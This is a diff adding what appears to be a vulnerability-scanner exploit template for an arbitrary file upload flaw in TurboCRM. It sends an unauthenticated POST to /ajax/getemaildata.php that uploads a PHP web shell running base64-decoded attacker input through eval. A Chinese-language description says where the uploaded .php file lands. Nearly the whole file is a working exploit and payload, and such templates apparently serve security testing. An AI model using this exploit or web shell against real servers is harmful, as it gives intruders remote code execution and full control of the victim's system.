@@ -1,0 +1,35 @@
+method: POST
+url: $
+tlsversion: HTTP/1.1
+uri: /ajax/getemaildata.php
+param: DontCheckLogin=1
+data: |
+ -----------------------------344329421119612311021814993770
+ Content-Disposition: form-data; name="file"; filename="shell.php "
+ Content-Type: text/php
+ 
+ <?php
+ @eval(base64_decode(($_POST['x'])));
+ ?>
+ 
+ -----------------------------344329421119612311021814993770
+ Content-Disposition: form-data; name="upload"
+ 
+ upload
+ -----------------------------344329421119612311021814993770--
+others: 
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0
+    Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
+    Accept-Language: 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
+    Accept-Encoding: gzip, deflate
+    Content-Type: 'multipart/form-data; boundary=---------------------------344329421119612311021814993770'
+    Content-Length: 386
+    Connection: keep-alive
+    Cookie: 'PHPSESSID=c7vlvgf1hhc8uat6r2nnu57333'
+    Upgrade-Insecure-Requests: 1
+condition: 
+    words: tmpfile
+    time: 
+expinformation: 
+    expname: TurboCRM任意文件上传
+    expdescribe: TurboCRM任意文件上传,路径为返回的tmpfile/mh70D7.tmp.mht换为tmpfile/upd70D6.tmp.php
